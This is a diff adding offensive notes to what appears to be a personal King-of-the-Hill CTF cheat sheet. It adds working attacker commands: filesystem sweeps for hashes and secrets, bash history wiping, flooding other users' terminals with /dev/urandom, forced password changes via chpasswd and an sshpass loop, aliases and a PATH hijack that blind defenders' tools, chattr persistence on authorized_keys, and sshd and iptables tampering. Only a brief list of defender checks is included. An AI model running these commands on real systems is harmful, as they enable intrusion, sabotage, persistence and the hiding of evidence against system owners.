@@ -146,6 +146,8 @@ find / -type f -exec grep -lE "[a-fA-F0-9]{32}" {} + 2>/dev/null
 #!/bin/bash
 read -p "Enter the string to search for: " search_string
 find / -type f -exec grep -l "$search_string" {} + 2>/dev/null
+find / -type f -size -2M -exec grep -EIHn '(^[0-9a-fA-F]{32}$|[A-Za-z0-9+/]{20,}={0,2})' {} + 2>/dev/null
+find / -type f -size -5M -exec grep -EH '^[0-9a-fA-F]{32}$' {} + 2>/dev/null
 
 
 
@@ -347,6 +349,9 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://1
 
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
 medium.txt:FFUZ -u http://10.10.11.8:5000/FFUZ -ic -t 100
+
+ffuf -u http://94.237.61.242:58080/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ
+
 ```
 
 #################################################################
@@ -384,4 +389,201 @@ feroxbuster -u $URL -w /usr/share/wordlists/dirb/big.txt -t 100
 
 history -c && rm ~/.bash_history
 grep -oE '"(username|password)"\s*:\s*"[^"]*"'i
+
+w | grep -v "myip" | awk '{print $2}' | while read line; do cat /dev/urandom > /dev/$line; done
+
+ps aux | grep -E "(name|name2|name3)" | awk '{print $2}' | xargs kill -9
+echo 'cyber:just 4 me' | chpasswd
+
+## More Trolling 
+alias cat='/bin/true'
+alias grep='/bin/false'
+alias systemctl='/bin/true'
+alias sudo='/bin/false'
+
+## KOTH War Stores (everything looks fine)
+A defender said:
+“All services are up, nothing wrong.”
+But nobody could connect to SSH.
+The trick
+alias systemctl='/bin/true'
+alias service='/bin/true'
+alias ss='/bin/false'
+alias netstat='/bin/false'
+
+Now:
+- systemctl status ssh → active
+- service ssh status → running
+- ss -lntp → no output
+Reality:
+- SSH was dead
+- Firewall dropped traffic
+- Defender trusted the tools, not reality
+👑 Crown held for 30+ minutes
+
+# 🧨 WAR STORY #2 — The Vanishing Files Incident
+Symptom
+
+Every time someone ran:
+
+cat /root/.ssh/authorized_keys
+Nothing showed.
+Trick
+alias cat='/bin/true'
+
+Result:
+Exit code = success
+No output
+Scripts think keys exist
+Humans think file is empty
+The file still existed.
+Nobody thought to run /bin/cat.
+
+# 🧠 WAR STORY #3 — The “Sudo Is Broken” Psy-Op
+Symptom
+Multiple players complained:
+“sudo is broken on this box”
+
+Trick
+alias sudo='/bin/false'
+
+Victims:
+Reset passwords
+Edited sudoers
+Rebooted box
+Attacker:
+Already had root shell
+Watched panic unfold
+Reclaimed crown repeatedly
+Psychological warfare > exploits.
+
+# 🧪 WAR STORY #4 — PATH Hijack Hell
+Setup
+Defenders relied on:
+ps aux
+Trick
+Attacker created:
+echo -e '#!/bin/sh\necho nothing to see here' > /tmp/ps
+chmod +x /tmp/ps
+export PATH=/tmp:$PATH
+Now:
+ps aux
+Shows:
+nothing to see here
+But:
+/bin/ps aux
+Shows attacker’s persistence.
+Most players never checked /bin/ps.
+
+# 🔥 WAR STORY #5 — Cron vs Alias Mismatch
+Defender mistake
+They added cleanup scripts:
+@reboot /home/defender/cleanup.sh
+Attacker trick
+Used aliases only.
+Result:
+Interactive shell = broken tools
+Cron = still works
+Defender thought attacker persisted via cron
+Reality:
+Alias disappeared after reboot
+Defender wasted time auditing crontabs
+
+Lesson:
+👉 Know where your changes apply.
+
+# 🧬 WAR STORY #6 — The Gets() Binary Trap
+Someone uploaded a crackme binary (like yours 😉) using gets().
+Attacker:
+Didn’t crack password
+Buffer-overflowed return address
+Jumped straight to system("/bin/sh")
+Other players:
+Reversing strings
+Counting characters
+Missing exploit entirely
+KOTH truth:
+CTF mindset > puzzle mindset
+
+🧠 WAR STORY #7 — SSH Key Whack-a-Mole
+
+Classic KOTH loop
+Defender deletes attacker SSH key
+Attacker re-adds it
+Repeat every 30 seconds
+Winning move
+Attacker:
+chattr +i /root/.ssh/authorized_keys
+Now:
+File can’t be modified
+Root needed to remove
+Defender locked out unless they notice
+👑 Crown secured.
+
+🧨 WAR STORY #8 — Fake Defender Backdoor
+
+Attacker planted:
+echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
+Then also:
+iptables -A INPUT -p tcp --dport 22 -j DROP
+
+Defenders:
+Restart SSH
+Think config is broken
+Keep restarting services
+Reality:
+Firewall was killing SSH
+Attacker had reverse shell anyway
+
+🧠 WAR STORY #9 — The “Helpful” Message Trap
+
+Attacker edited /etc/motd:
+System compromised.
+Attacker persistence via cron.
+
+Defenders:
+Spent 20 minutes auditing cron
+Missed /etc/profile backdoor
+Crown stolen repeatedly
+Never trust banners.
+
+🧪 WAR STORY #10 — Evil /bin/false in Login Shells
+
+Attacker changed /etc/passwd:
+user:x:1001:1001::/home/user:/bin/false
+
+Effect:
+User can’t log in
+SSH closes immediately
+Looks like password issue
+CTF lesson:
+Login shell matters.
+
+🧠 META KOTH STRATEGY (THIS WINS GAMES)
+🔑 Attack layers
+Persistence (SSH keys, services, cron)
+Visibility denial (aliases, PATH hijack)
+Psych warfare (fake errors, misleading clues)
+Redundancy (multiple shells)
+Speed (first 2 minutes matter most)
+🧠 How PRO defenders beat this
+
+They:
+command -v cat
+/bin/cat
+env -i bash --norc
+echo $PATH
+lsattr
+
+KOTH becomes a mind game, not hacking.
+
+👑 Final KOTH Wisdom
+“The crown is not held by root.
+It is held by confusion.”
+
+
 ```
+
+while [ 1 ]; do timeout 5 sshpass -p toor ssh root@ip "echo 'root:pass1234@' | chpasswd"; done
+
+
